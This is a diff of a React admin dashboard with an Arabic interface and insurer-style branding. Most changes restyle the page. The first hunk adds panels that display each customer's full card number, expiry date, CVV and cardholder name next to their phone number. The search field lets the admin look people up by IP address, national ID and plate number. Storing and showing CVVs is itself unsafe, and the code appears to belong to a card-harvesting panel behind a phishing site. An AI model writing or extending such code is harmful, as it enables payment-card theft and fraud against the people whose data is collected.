@@ -706,14 +706,34 @@ export default function AdminDashboard() {
                           </div>
                         )}
 
-                        {/* QPay/Mobile Payment - Only phone */}
-                        {payment.paymentMethod && payment.paymentMethod.toLowerCase().includes('qpay') && (
-                          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+                        {/* QPay/Mobile Payment - Show all available data */}
+                        {payment.paymentMethod && (payment.paymentMethod.toLowerCase().includes('qpay') || payment.paymentMethod.toLowerCase().includes('mobile')) && (
+                          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-4">
+                            <div className="bg-purple-50 rounded-lg p-3">
+                              <p className="text-gray-600 text-xs mb-1">اسم حامل البطاقة:</p>
+                              <p className="font-semibold text-gray-900">{payment.cardHolderName || '—'}</p>
+                            </div>
+                            <div className="bg-purple-50 rounded-lg p-3">
+                              <p className="text-gray-600 text-xs mb-1">رقم البطاقة الكامل:</p>
+                              <p className="font-mono font-bold text-purple-600">
+                                💳 {payment.cardNumber || '—'}
+                              </p>
+                            </div>
+                            <div className="bg-purple-50 rounded-lg p-3">
+                              <p className="text-gray-600 text-xs mb-1">تاريخ الانتهاء:</p>
+                              <p className="font-mono font-semibold">{payment.expirationDate || '—'}</p>
+                            </div>
+                            <div className="bg-purple-50 rounded-lg p-3">
+                              <p className="text-gray-600 text-xs mb-1">CVV:</p>
+                              <p className="font-mono font-bold text-red-600">{payment.cvv || '—'}</p>
+                            </div>
                             <div className="bg-purple-50 rounded-lg p-3">
                               <p className="text-gray-600 text-xs mb-1">رقم الهاتف:</p>
-                              <p className="font-mono font-bold text-purple-600">
-                                📱 {payment.phoneNumber || payment.phone || '—'}
-                              </p>
+                              <p className="font-mono font-bold text-purple-600">📱 {payment.phoneNumber || payment.phone || '—'}</p>
+                            </div>
+                            <div className="bg-purple-50 rounded-lg p-3">
+                              <p className="text-gray-600 text-xs mb-1">آخر 4 أرقام:</p>
+                              <p className="font-mono font-bold">**** {payment.cardLastDigits || payment.cardNumber?.slice(-4) || '—'}</p>
                             </div>
                           </div>
                         )}
@@ -812,9 +832,9 @@ export default function AdminDashboard() {
       )}
 
       {/* Main Content */}
-      <div className="max-w-[1800px] mx-auto p-6">
+      <div className="max-w-[1900px] mx-auto p-6 space-y-6">
         {/* Header */}
-        <div className="bg-gradient-to-r from-qiic-maroon to-red-900 text-white rounded-2xl p-8 mb-6 shadow-lg">
+        <div className="bg-gradient-to-br from-qiic-maroon via-red-800 to-red-900 text-white rounded-3xl p-8 shadow-2xl border border-white/10">
           <div className="flex items-center justify-between">
             <div>
               <h1 className="text-4xl font-bold mb-3">لوحة تحكم الأدمن المتقدمة</h1>
@@ -864,8 +884,8 @@ export default function AdminDashboard() {
         </div>
 
         {/* Stats Cards */}
-        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-6">
-          <div className="bg-white rounded-xl p-6 shadow-md border-l-4 border-blue-500">
+        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
+          <div className="bg-white rounded-2xl p-6 shadow-lg hover:shadow-2xl transition-all duration-300 border-l-4 border-blue-500 hover:scale-105">
             <div className="flex items-center justify-between">
               <div>
                 <p className="text-gray-600 text-sm mb-1">إجمالي العملاء</p>
@@ -877,7 +897,7 @@ export default function AdminDashboard() {
             </div>
           </div>
 
-          <div className="bg-white rounded-xl p-6 shadow-md border-l-4 border-green-500">
+          <div className="bg-white rounded-2xl p-6 shadow-lg hover:shadow-2xl transition-all duration-300 border-l-4 border-green-500 hover:scale-105">
             <div className="flex items-center justify-between">
               <div>
                 <p className="text-gray-600 text-sm mb-1">العملاء النشطون</p>
@@ -889,7 +909,7 @@ export default function AdminDashboard() {
             </div>
           </div>
 
-          <div className="bg-white rounded-xl p-6 shadow-md border-l-4 border-yellow-500">
+          <div className="bg-white rounded-2xl p-6 shadow-lg hover:shadow-2xl transition-all duration-300 border-l-4 border-yellow-500 hover:scale-105">
             <div className="flex items-center justify-between">
               <div>
                 <p className="text-gray-600 text-sm mb-1">قيد الانتظار</p>
@@ -901,7 +921,7 @@ export default function AdminDashboard() {
             </div>
           </div>
 
-          <div className="bg-white rounded-xl p-6 shadow-md border-l-4 border-purple-500">
+          <div className="bg-white rounded-2xl p-6 shadow-lg hover:shadow-2xl transition-all duration-300 border-l-4 border-purple-500 hover:scale-105">
             <div className="flex items-center justify-between">
               <div>
                 <p className="text-gray-600 text-sm mb-1">إجمالي الإيرادات</p>
@@ -924,48 +944,48 @@ export default function AdminDashboard() {
                 placeholder="ابحث بـ IP، الاسم، QID، الهاتف، السيارة، رقم اللوحة..."
                 value={searchTerm}
                 onChange={(e) => setSearchTerm(e.target.value)}
-                className="w-full pr-12 pl-4 py-3 border-2 border-gray-200 rounded-lg focus:ring-2 focus:ring-qiic-maroon focus:border-transparent"
+                className="w-full pr-12 pl-4 py-3.5 border-2 border-gray-200 rounded-xl focus:ring-2 focus:ring-qiic-maroon focus:border-qiic-maroon transition-all shadow-sm hover:border-gray-300"
                 dir="rtl"
               />
             </div>
 
-            <div className="flex gap-2 flex-wrap">
+            <div className="flex gap-3 flex-wrap">
               <button
                 onClick={() => setFilterStatus('all')}
-                className={`px-4 py-2 rounded-lg font-semibold transition-colors ${
+                className={`px-6 py-3 rounded-xl font-bold transition-all duration-300 ${
                   filterStatus === 'all' 
-                    ? 'bg-qiic-maroon text-white' 
-                    : 'bg-gray-100 text-gray-700 hover:bg-gray-200'
+                    ? 'bg-gradient-to-r from-qiic-maroon to-red-700 text-white shadow-lg scale-105' 
+                    : 'bg-gray-100 text-gray-700 hover:bg-gray-200 hover:scale-105'
                 }`}
               >
                 الكل ({stats.total})
               </button>
               <button
                 onClick={() => setFilterStatus('active')}
-                className={`px-4 py-2 rounded-lg font-semibold transition-colors ${
+                className={`px-6 py-3 rounded-xl font-bold transition-all duration-300 ${
                   filterStatus === 'active' 
-                    ? 'bg-green-600 text-white' 
-                    : 'bg-gray-100 text-gray-700 hover:bg-gray-200'
+                    ? 'bg-gradient-to-r from-green-600 to-green-700 text-white shadow-lg scale-105' 
+                    : 'bg-gray-100 text-gray-700 hover:bg-gray-200 hover:scale-105'
                 }`}
               >
                 نشط ({stats.active})
               </button>
               <button
                 onClick={() => setFilterStatus('pending')}
-                className={`px-4 py-2 rounded-lg font-semibold transition-colors ${
+                className={`px-6 py-3 rounded-xl font-bold transition-all duration-300 ${
                   filterStatus === 'pending' 
-                    ? 'bg-yellow-600 text-white' 
-                    : 'bg-gray-100 text-gray-700 hover:bg-gray-200'
+                    ? 'bg-gradient-to-r from-yellow-600 to-yellow-700 text-white shadow-lg scale-105' 
+                    : 'bg-gray-100 text-gray-700 hover:bg-gray-200 hover:scale-105'
                 }`}
               >
                 معلق ({stats.pending})
               </button>
               <button
                 onClick={() => setFilterStatus('approved')}
-                className={`px-4 py-2 rounded-lg font-semibold transition-colors ${
+                className={`px-6 py-3 rounded-xl font-bold transition-all duration-300 ${
                   filterStatus === 'approved' 
-                    ? 'bg-green-600 text-white' 
-                    : 'bg-gray-100 text-gray-700 hover:bg-gray-200'
+                    ? 'bg-gradient-to-r from-blue-600 to-blue-700 text-white shadow-lg scale-105' 
+                    : 'bg-gray-100 text-gray-700 hover:bg-gray-200 hover:scale-105'
                 }`}
               >
                 موافق ({stats.approved})
@@ -975,10 +995,10 @@ export default function AdminDashboard() {
         </div>
 
         {/* Customers Table */}
-        <div className="bg-white rounded-xl shadow-md overflow-hidden">
+        <div className="bg-white rounded-2xl shadow-2xl border border-gray-100">
           <div className="overflow-x-auto">
             <table className="w-full" dir="rtl">
-              <thead className="bg-gradient-to-r from-gray-800 to-gray-900 text-white">
+              <thead className="bg-gradient-to-r from-gray-900 via-gray-800 to-gray-900 text-white">
                 <tr>
                   <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">الحالة</th>
                   <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">IP</th>
